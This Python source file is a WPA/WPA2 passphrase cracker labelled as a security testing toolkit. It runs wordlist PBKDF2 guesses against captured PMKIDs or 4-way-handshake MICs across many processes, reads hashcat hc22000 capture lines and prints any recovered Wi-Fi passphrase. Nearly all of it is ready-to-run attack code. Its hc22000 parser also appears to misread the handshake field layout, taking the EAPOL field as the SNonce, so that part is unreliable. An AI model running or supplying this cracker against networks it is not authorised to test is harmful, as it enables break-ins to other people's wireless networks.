"""
WiFi Security Testing Toolkit — WPA/WPA2 Cracker
Supports PBKDF2 passphrase cracking (wordlist), PMKID verification,
and standard 4-way handshake MIC verification with multiprocessing.
"""

from __future__ import annotations

import hashlib
import hmac
import struct
import time
import sys
import os
from pathlib import Path
from multiprocessing import Pool, cpu_count
from dataclasses import dataclass
from typing import Optional


@dataclass
class CrackTarget:
    ssid: str
    bssid: str = ""
    station: str = ""
    anonce: bytes = b""
    snonce: bytes = b""
    mic: bytes = b""
    eapol_data: bytes = b""
    pmkid: bytes | None = None


class WPACracker:
    """High-performance WPA/WPA2 passphrase cracker."""

    MIN_PASSPHRASE_LEN = 8
    MAX_PASSPHRASE_LEN = 63

    @staticmethod
    def pbkdf2_hmac_sha1(password: str, ssid: str, iterations: int = 4096) -> bytes:
        return hashlib.pbkdf2_hmac(
            "sha1",
            password.encode("utf-8"),
            ssid.encode("utf-8"),
            iterations,
            dklen=32,
        )

    @staticmethod
    def compute_pmkid(pmk: bytes, bssid: bytes, station: bytes) -> bytes:
        label = b"PMK Name"
        data = label + bssid + station
        return hmac.new(pmk, data, "sha1").digest()[:16]

    @staticmethod
    def compute_ptk(pmk: bytes, anonce: bytes, snonce: bytes,
                    ap_mac: bytes, sta_mac: bytes) -> bytes:
        a = b"Pairwise key expansion"
        b = min(ap_mac, sta_mac) + max(ap_mac, sta_mac) + \
            min(anonce, snonce) + max(anonce, snonce)

        result = b""
        for i in range(4):
            round_input = a + b"\x00" + b + struct.pack(">B", i)
            result += hmac.new(pmk, round_input, "sha1").digest()

        return result[:64]

    @staticmethod
    def verify_mic(pmk: bytes, target: CrackTarget) -> bool:
        ap_mac = bytes.fromhex(target.bssid.replace(":", ""))
        sta_mac = bytes.fromhex(target.station.replace(":", ""))

        ptk = WPACracker.compute_ptk(pmk, target.anonce, target.snonce,
                                     ap_mac, sta_mac)
        kck = ptk[:16]

        eapol_mutable = bytearray(target.eapol_data)
        eapol_mutable[81:97] = b'\x00' * 16

        computed_mic = hmac.new(kck, eapol_mutable, "sha1").digest()[:16]
        return computed_mic == target.mic

    @staticmethod
    def verify_pmkid(pmk: bytes, target: CrackTarget) -> bool:
        if not target.pmkid:
            return False
        bssid_bytes = bytes.fromhex(target.bssid.replace(":", ""))
        sta_bytes = bytes.fromhex(target.station.replace(":", ""))
        computed = WPACracker.compute_pmkid(pmk, bssid_bytes, sta_bytes)
        return computed == target.pmkid

    @classmethod
    def crack_wordlist(cls, target: CrackTarget, wordlist_path: str | Path,
                       workers: int | None = None) -> tuple[str | None, float]:
        if workers is None:
            workers = cpu_count()

        wordlist = Path(wordlist_path)
        if not wordlist.exists():
            raise FileNotFoundError(f"Wordlist not found: {wordlist_path}")

        total_lines = sum(1 for _ in open(wordlist, "r", errors="ignore"))
        print(f"[*] Wordlist: {wordlist} ({total_lines:,} entries)")
        print(f"[*] Workers: {workers}")
        print(f"[*] Target: {target.ssid} ({target.bssid})")
        if target.pmkid:
            print(f"[*] Mode: PMKID")
        else:
            print(f"[*] Mode: 4-way Handshake MIC")

        start = time.time()

        chunk_size = max(1000, total_lines // (workers * 10))
        chunks = []
        current_chunk = []
        with open(wordlist, "r", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if cls.MIN_PASSPHRASE_LEN <= len(line) <= cls.MAX_PASSPHRASE_LEN:
                    current_chunk.append(line)
                    if len(current_chunk) >= chunk_size:
                        chunks.append(current_chunk)
                        current_chunk = []
            if current_chunk:
                chunks.append(current_chunk)

        print(f"[*] Chunks: {len(chunks)} x ~{chunk_size} words")
        print(f"[*] Cracking...\n")

        with Pool(processes=min(workers, len(chunks))) as pool:
            args = [(chunk, target) for chunk in chunks]
            for i, result in enumerate(pool.imap_unordered(_crack_chunk, args)):
                if result:
                    elapsed = time.time() - start
                    pool.terminate()
                    print(f"\n[+] CRACKED! Passphrase: {result}")
                    print(f"[+] Time: {elapsed:.1f}s")
                    return (result, elapsed)
                if (i + 1) % max(1, len(chunks) // 10) == 0:
                    pct = (i + 1) / len(chunks) * 100
                    elapsed = time.time() - start
                    rate = (i + 1) * chunk_size / elapsed
                    print(f"\r    Progress: {pct:.0f}% | {elapsed:.1f}s | "
                          f"{rate:,.0f} words/sec", end="", flush=True)

        elapsed = time.time() - start
        print(f"\n[-] Not found in wordlist ({elapsed:.1f}s)")
        return (None, elapsed)


def _crack_chunk(args: tuple[list[str], CrackTarget]) -> str | None:
    words, target = args

    for word in words:
        pmk = WPACracker.pbkdf2_hmac_sha1(word, target.ssid)

        if target.pmkid:
            if WPACracker.verify_pmkid(pmk, target):
                return word
        else:
            if WPACracker.verify_mic(pmk, target):
                return word

    return None


def _parse_hashcat_line(line: str) -> CrackTarget | None:
    line = line.strip()
    if not line.startswith("WPA*"):
        return None

    parts = line.rstrip("*").split("*")
    if len(parts) < 6:
        return None

    version = parts[1]
    ssid = bytes.fromhex(parts[5]).decode("utf-8", errors="replace") if parts[5] else ""

    if version == "01" and len(parts) >= 5:
        return CrackTarget(
            ssid=ssid,
            bssid=":".join(parts[3][i:i + 2] for i in range(0, 12, 2)).upper(),
            station=":".join(parts[4][i:i + 2] for i in range(0, 12, 2)).upper(),
            pmkid=bytes.fromhex(parts[2]),
        )
    elif version == "02" and len(parts) >= 9:
        return CrackTarget(
            ssid=ssid,
            bssid=":".join(parts[3][i:i + 2] for i in range(0, 12, 2)).upper(),
            station=":".join(parts[4][i:i + 2] for i in range(0, 12, 2)).upper(),
            mic=bytes.fromhex(parts[2]),
            anonce=bytes.fromhex(parts[6]),
            snonce=bytes.fromhex(parts[7]),
            eapol_data=bytes.fromhex(parts[8]),
        )

    return None


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="WPA/WPA2 Passphrase Cracker")
    parser.add_argument("-w", "--wordlist", required=True,
                        help="Path to wordlist file")
    parser.add_argument("--hashcat", type=str,
                        help="hashcat hc22000 file (from handshake.py --hashcat)")
    parser.add_argument("--ssid", type=str, help="Network SSID")
    parser.add_argument("--bssid", type=str, help="AP BSSID (MAC)")
    parser.add_argument("--station", type=str, help="Client MAC")
    parser.add_argument("--pmkid", type=str, help="PMKID hex string")
    parser.add_argument("--mic", type=str, help="MIC hex string")
    parser.add_argument("--anonce", type=str, help="ANonce hex string")
    parser.add_argument("--snonce", type=str, help="SNonce hex string")
    parser.add_argument("--eapol", type=str, help="EAPOL data hex string")
    parser.add_argument("-j", "--jobs", type=int, default=None,
                        help="Number of worker processes")
    args = parser.parse_args()

    targets: list[CrackTarget] = []

    if args.hashcat:
        with open(args.hashcat, "r") as f:
            for line in f:
                target = _parse_hashcat_line(line)
                if target:
                    targets.append(target)
    elif args.ssid and args.bssid:
        target = CrackTarget(
            ssid=args.ssid,
            bssid=args.bssid,
            station=args.station or "",
            pmkid=bytes.fromhex(args.pmkid) if args.pmkid else None,
            mic=bytes.fromhex(args.mic) if args.mic else b"",
            anonce=bytes.fromhex(args.anonce) if args.anonce else b"",
            snonce=bytes.fromhex(args.snonce) if args.snonce else b"",
            eapol_data=bytes.fromhex(args.eapol) if args.eapol else b"",
        )
        targets.append(target)
    else:
        print("[!] Provide --hashcat file or --ssid and --bssid")
        sys.exit(1)

    for target in targets:
        if not target.pmkid and not target.mic:
            print(f"[!] Skipping {target.ssid}: No PMKID or MIC/EAPOL data")
            continue

        passphrase, elapsed = WPACracker.crack_wordlist(
            target, args.wordlist, workers=args.jobs
        )
        if passphrase:
            print(f"\n{'='*50}")
            print(f"  SSID:       {target.ssid}")
            print(f"  BSSID:      {target.bssid}")
            print(f"  PASS:       {passphrase}")
            print(f"  Time:       {elapsed:.1f}s")
            print(f"{'='*50}")
